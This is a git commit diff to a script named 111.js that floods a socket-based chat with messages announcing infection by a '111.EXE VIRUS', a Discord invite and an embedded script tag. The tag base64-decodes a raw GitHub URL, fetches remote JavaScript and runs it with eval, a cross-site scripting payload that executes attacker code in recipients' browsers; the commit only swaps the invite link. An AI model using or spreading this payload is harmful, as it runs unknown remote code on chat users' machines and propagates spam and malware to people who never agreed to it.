242a0b3e3dc5037252b92830966623a7ef76502e
Windows Xp Sky <reinilsonfernandes25@outlook.com>
2026-01-19 11:22:46 -0300

    Update 111.js

--- 111.js
+++ 111.js
@@ -12,10 +12,10 @@ let coughtimer = 7777; setInterval(() => {
     });
     setInterval(() => {
     socketb.emit("talk", {
-        text: "YOUVE BEEN INFECTED BY THE 111.EXE VIRUS! https://discord.gg/8c5HTrMM <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
+        text: "YOUVE BEEN INFECTED BY THE 111.EXE VIRUS! https://discord.gg/7z8uZqvF <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
     });
     socket.emit("talk", {
-        text: "YOUVE BEEN INFECTED BY THE 111.EXE VIRUS! https://discord.gg/8c5HTrMM <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
+        text: "YOUVE BEEN INFECTED BY THE 111.EXE VIRUS! https://discord.gg/7z8uZqvF <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
             });
     });
     coughtimer = coughtimer - 125;
